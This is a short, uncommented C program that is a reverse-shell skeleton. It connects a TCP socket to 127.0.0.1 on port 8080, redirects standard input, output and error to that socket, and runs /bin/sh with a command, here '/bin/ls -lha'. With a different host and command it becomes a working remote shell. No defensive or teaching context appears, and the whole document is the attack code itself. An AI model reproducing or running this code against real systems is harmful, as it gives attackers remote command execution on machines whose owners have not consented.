#include <unistd.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>

int main() {
  struct sockaddr_in sa;
  int sock;

  sa.sin_family = AF_INET;
  sa.sin_addr.s_addr = inet_addr("127.0.0.1");
  sa.sin_port = htons(8080);
  sock = socket(AF_INET, SOCK_STREAM, 0);
  connect(sock, (struct sockaddr*)&sa, sizeof(sa));
  dup2(sock, 0);
  dup2(sock, 1);
  dup2(sock, 2);

  char *args[] = {"/bin/sh", "-c", "/bin/ls -lha", 0};
  execve(args[0], args, NULL);
  return 0;
}
